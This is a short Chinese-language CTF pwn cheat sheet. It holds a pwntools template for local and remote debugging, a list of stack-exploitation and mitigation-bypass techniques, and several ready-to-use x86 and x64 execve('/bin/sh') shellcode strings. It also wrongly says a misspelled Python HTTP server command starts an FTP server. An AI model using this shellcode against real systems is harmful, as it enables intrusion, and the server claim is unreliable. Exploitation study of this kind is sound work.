# 鶸的PWN小结
P.S.实在太菜，所以都很基础，慢慢维护
## 快速开启ftp服务器

```
python -m SimpleHTTPSerber
```
会在当前运行目录下开启ftp服务
## PWNTool 远程/本地调试模板

```python
#!/usr/bin/env python2
# coding:utf-8
from pwn import *
import os

VERBOSE = 1
DEBUG   = 1
LOCAL   = 0

target = 'target'
libc   = []         # 加载指定libc
break_points = []
remote_addr = '39.107.33.43'
remote_port = 13572

def hint(break_points=[]):
    if LOCAL:
        out = 'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n") 
if libc:
    elf = ELF(libc[0])
    gadget = lambda x: next(elf.search(asm(x, os='linux', arch='amd64')))

if LOCAL:
    if libc:
        for libc_ in libc:
            os.environ['LD_PRELOAD'] = os.environ['PWD'] + '/' + libc_ + ':'
    p = process('./'+target)
    if DEBUG:
        out =  'gdb attach ' + str(pwnlib.util.proc.pidof(target)[0])
        for bp in break_points:
            out += " -ex 'b *{}'".format(hex(bp))
        raw_input(out+" -ex 'c'\n" if break_points else out+"\n")
else:
    p = remote(remote_addr,remote_port)

if VERBOSE: context.log_level = 'DEBUG'

```

## Return to dl_resolve

http://pwn4.fun/2016/11/09/Return-to-dl-resolve/
这个写的比较清楚
## shellcraft
编写shellcode

## linux保护机制的绕过方法

现代栈溢出利用技术基础：ROP

利用signal机制的ROP技术：SROP

没有binary怎么办：BROP 、dump bin

劫持栈指针：stack pivot

利用动态链接绕过ASLR：ret2dl resolve、fake linkmap

利用地址低12bit绕过ASLR：Partial Overwrite

绕过stack canary：改写指针与局部变量、leak canary、overwrite canary

溢出位数不够怎么办：覆盖ebp，Partial Overwrite

现代栈溢出利用技术基础:ROP

## 23字节shellcode
搜索地址【http://shell-storm.org/online/Online-Assembler-and-Disassembler/】
```
char *shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"
    "\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
```

```

"\x33\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
```
## 19字节shellcode（x64）
“\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05”
## shellcode(x86)
"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
## IDA keypatch问题相关

https://github.com/keystone-engine/keypatch/issues/28
